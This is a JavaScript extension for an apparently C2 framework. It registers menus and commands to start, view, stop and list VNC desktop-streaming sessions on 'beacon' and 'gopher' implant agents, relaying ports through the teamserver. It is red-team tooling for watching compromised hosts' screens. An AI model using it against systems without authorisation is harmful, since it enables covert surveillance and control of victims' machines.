/// VNC Remote Desktop Service

let vnc_menu = menu.create_menu("VNC Desktop");

let vnc_start_action = menu.create_action("Start VNC Session", function(agents) {
    agents.forEach(function(agent) {
        let label_target_port = form.create_label("Target Port (on agent):");
        let spin_target_port = form.create_spin();
        spin_target_port.setRange(1024, 65535);
        spin_target_port.setValue(40484);

        let label_local_port = form.create_label("Local Port (on C2):");
        let spin_local_port = form.create_spin();
        spin_local_port.setRange(1024, 65535);
        spin_local_port.setValue(41484);

        let layout = form.create_gridlayout();
        layout.addWidget(label_target_port, 0, 0, 1, 1);
        layout.addWidget(spin_target_port, 0, 1, 1, 1);
        layout.addWidget(label_local_port, 1, 0, 1, 1);
        layout.addWidget(spin_local_port, 1, 1, 1, 1);

        let dialog = form.create_dialog("Start VNC Session");
        dialog.setSize(400, 120);
        dialog.setLayout(layout);

        if (dialog.exec() == true) {
            let target_port = spin_target_port.value();
            let local_port = spin_local_port.value();
            ax.execute_command(agent, "vnc start " + target_port + " " + local_port);
        }
    });
});

let vnc_view_action = menu.create_action("View Desktop", function(agents) {
    agents.forEach(function(agent) {
        ax.execute_command(agent, "vnc view");
    });
});

let vnc_stop_action = menu.create_action("Stop VNC Session", function(agents) {
    agents.forEach(function(agent) {
        let label_local_port = form.create_label("Local Port (on C2):");
        let spin_local_port = form.create_spin();
        spin_local_port.setRange(1024, 65535);
        spin_local_port.setValue(41484);

        let layout = form.create_gridlayout();
        layout.addWidget(label_local_port, 0, 0, 1, 1);
        layout.addWidget(spin_local_port, 0, 1, 1, 1);

        let dialog = form.create_dialog("Stop VNC Session");
        dialog.setSize(300, 90);
        dialog.setLayout(layout);

        if (dialog.exec() == true) {
            ax.execute_command(agent, "vnc stop " + spin_local_port.value());
        }
    });
});

let vnc_list_action = menu.create_action("List VNC Sessions", function(agents) {
    ax.execute_command(agents[0], "vnc list");
});

vnc_menu.addItem(vnc_start_action);
vnc_menu.addItem(vnc_view_action);
vnc_menu.addItem(vnc_stop_action);
vnc_menu.addSeparator();
vnc_menu.addItem(vnc_list_action);

menu.add_session_agent(vnc_menu, ["beacon", "gopher"]);


function RegisterCommands(listenerType) {

    let cmd_vnc = ax.create_command("vnc", "VNC Remote Desktop - control remote desktop sessions",
        "vnc start 40484 41484", "VNC: Remote Desktop Session");

    let cmd_vnc_start = ax.create_command("start", "Start a VNC desktop streaming session on the target",
        "vnc start 40484 41484", "VNC: Start streaming session");
    cmd_vnc_start.addArgInt("target_port", true, "Listen port on agent");
    cmd_vnc_start.addArgInt("local_port", true, "Listen port on teamserver");

    let cmd_vnc_view = ax.create_command("view", "Open the VNC viewer for the active session",
        "vnc view", "VNC: Open viewer");

    let cmd_vnc_stop = ax.create_command("stop", "Stop the VNC desktop streaming session",
        "vnc stop 41484", "VNC: Stop session");
    cmd_vnc_stop.addArgInt("local_port", true, "Listen port on teamserver");

    let cmd_vnc_list = ax.create_command("list", "List all active VNC sessions",
        "vnc list", "VNC: List sessions");

    cmd_vnc.addSubCommands([cmd_vnc_start, cmd_vnc_view, cmd_vnc_stop, cmd_vnc_list]);

    let commands = ax.create_commands_group("vnc", [cmd_vnc]);
    return {
        commands_windows: commands,
        commands_linux: commands
    };
}
